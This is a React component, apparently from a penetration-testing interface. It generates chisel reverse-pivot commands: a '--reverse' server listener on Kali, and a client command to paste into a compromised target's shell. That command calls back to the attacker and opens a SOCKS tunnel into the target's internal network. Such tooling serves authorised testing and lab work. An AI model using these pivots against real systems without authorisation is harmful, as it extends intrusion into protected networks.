import { useState } from "react";

type Mode = "socks" | "port";

// chisel's normal mode needs the server (Kali) to be reachable from the
// target, which is exactly backwards from what a NAT'd/firewalled internal
// host allows — so nearly every real pivot uses reverse mode instead: a
// chisel *server* on Kali with --reverse, and a chisel *client* run on the
// target that dials out to it. That's the same shape as a reverse shell
// (listener here, payload pasted there), so this sits right next to
// ReverseShellPanel and reuses the same "prep a listener in a manual shell"
// flow rather than adding a new backend connection type.
export default function ChiselPivotPanel({ onStartListener }: {
  onStartListener: (command: string) => void;
}) {
  const [lhost, setLhost] = useState("");
  const [lport, setLport] = useState("8000");
  const [mode, setMode] = useState<Mode>("socks");
  const [remoteHost, setRemoteHost] = useState("");
  const [remotePort, setRemotePort] = useState("");

  const serverReady = lport.trim();
  const clientTarget = mode === "socks" ? "R:socks"
    : `R:${remotePort.trim() || "<local_port>"}:${remoteHost.trim() || "<remote_host>"}:${remotePort.trim() || "<remote_port>"}`;
  const clientCommand = lhost.trim() && lport.trim()
    ? `chisel client ${lhost.trim()}:${lport.trim()} ${clientTarget}` : "";

  return (
    <section className="netexecCredCheck" aria-labelledby="chisel-heading">
      <header>
        <h2 id="chisel-heading">Chisel 리버스 피벗</h2>
        <small>대상이 아웃바운드만 가능할 때(NAT·방화벽 뒤) 씁니다. Kali에서 --reverse 서버를
          띄우고, 그 클라이언트 명령을 대상 셸에 붙여넣으면 SOCKS 프록시가 Kali 쪽(기본
          127.0.0.1:1080)에 열려 proxychains로 바로 쓸 수 있습니다.</small>
      </header>
      <div className="netexecCredForm">
        <input value={lport} onChange={(e) => setLport(e.target.value)}
          placeholder="LPORT (chisel 서버 대기 포트)" aria-label="LPORT" />
        <button disabled={!serverReady}
          onClick={() => onStartListener(`chisel server -p ${lport.trim()} --reverse`)}>
          리스너 준비 (chisel server --reverse)
        </button>
      </div>
      <div className="netexecCredForm">
        <input value={lhost} onChange={(e) => setLhost(e.target.value)}
          placeholder="Kali IP (예: 10.10.14.5)" aria-label="Kali IP" />
        <select value={mode} onChange={(e) => setMode(e.target.value as Mode)}
          aria-label="피벗 방식">
          <option value="socks">SOCKS 전체 (R:socks)</option>
          <option value="port">특정 포트만 (R:local:remote_host:remote_port)</option>
        </select>
      </div>
      {mode === "port" && (
        <div className="netexecCredForm">
          <input value={remoteHost} onChange={(e) => setRemoteHost(e.target.value)}
            placeholder="대상 쪽에서 본 REMOTE_HOST" aria-label="REMOTE_HOST" />
          <input value={remotePort} onChange={(e) => setRemotePort(e.target.value)}
            placeholder="REMOTE_PORT (Kali 쪽 노출 포트와 동일)" aria-label="REMOTE_PORT" />
        </div>
      )}
      {clientCommand && <>
        <code className="revshellPayload">{clientCommand}</code>
        <small>위 명령을 대상 셸에 붙여넣어 실행하세요 (Windows는 chisel.exe). Linux 바이너리를
          올려야 한다면 서버가 먼저 켜져 있어야 클라이언트가 접속됩니다.</small>
      </>}
    </section>
  );
}
